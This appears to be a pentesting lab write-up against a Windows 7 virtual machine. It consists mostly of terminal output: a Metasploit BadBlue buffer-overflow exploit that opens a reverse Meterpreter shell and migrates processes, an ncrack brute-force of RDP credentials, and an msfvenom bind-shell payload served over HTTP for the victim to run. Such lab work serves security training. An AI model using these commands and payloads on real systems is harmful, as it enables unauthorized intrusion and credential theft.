Windows Endpoint Pentesting

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SoMware Based Vulnerabilites

https://www.exploit-db.com/exploits/16806/
BadBlue 2.72b

In Kali
msf > search Badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49242) at 2017-03-01 11:17:09 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getpid
Current pid: 2872
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0
 280   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 324   656   WmiPrvSE.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 380   364   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 432   364   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 440   424   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 488   432   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 512   432   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 520   432   lsm.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 532   424   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 656   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 724   488   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 740   488   dllhost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
 756   488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 808   488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 896   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 1144  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1264  488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1360  488   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1396  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1456  488   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1508  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1600  488   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1664  488   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1860  488   TPAutoConnSvc.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 1940  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2132  488   taskhost.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\system32\taskhost.exe
 2204  896   dwm.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\Dwm.exe
 2228  2196  explorer.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\Explorer.EXE
 2292  488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2340  2228  vmtoolsd.exe       x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2704  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2720  1860  TPAutoConnect.exe  x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2728  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2756  488   SearchIndexer.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
 2856  488   wmpnetwk.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
 2872  1840  badblue.exe        x86   1        ABCD-PC\ABCD                  C:\Program Files\BadBlue\EE\BadBlue.exe
 3168  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3468  2228  cmd.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\cmd.exe

meterpreter > migrate 2228
[*] Migrating from 2872 to 2228...
[*] Migration completed successfully.
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

RDP Misconfiguration

In Windows 7
Enable RDP
Control Panel -> System and Security -> System -> Remote Settings -> Allow connections from computers running any version of Remote Desktop (less secure)

In Kali
$ nmap -sV -p3389 -n 192.168.1.14

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-01 11:20 EST
Nmap scan report for 192.168.1.14
Host is up (0.00042s latency).
PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:4D:B8:A9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

$ ncrack -U rdp_user_list -P rdp_pass_list -p rdp 192.168.1.14

Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-03-01 11:23 EST

Discovered credentials for rdp on 192.168.1.14 3389/tcp:
192.168.1.14 3389/tcp rdp: 'ABCD' 'Ab12345'

Ncrack done: 1 service scanned in 6.00 seconds.

Ncrack finished.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Social Engineering

In Kali
$ msfvenom -p windows/meterpreter_bind_tcp -a x86 -f exe > Bind_Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 957999 bytes
Final size of exe file: 1033216 bytes
$ file Bind_Payload.exe
Bind_Payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:32] "GET /Bind_Payload.exe HTTP/1.1" 200 -

In Windows 7
In Browser
https://192.168.1.13:8000
Run Bind_Payload.exe
C:\Users\ABCD>netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:49389        ABCD-PC:49390          ESTABLISHED
  TCP    127.0.0.1:49390        ABCD-PC:49389          ESTABLISHED
  TCP    192.168.1.14:4444      192.168.1.13:35761     ESTABLISHED

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(handler) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(handler) > exploit

[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:35761 -> 192.168.1.14:4444) at 2017-03-01 11:43:50 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >
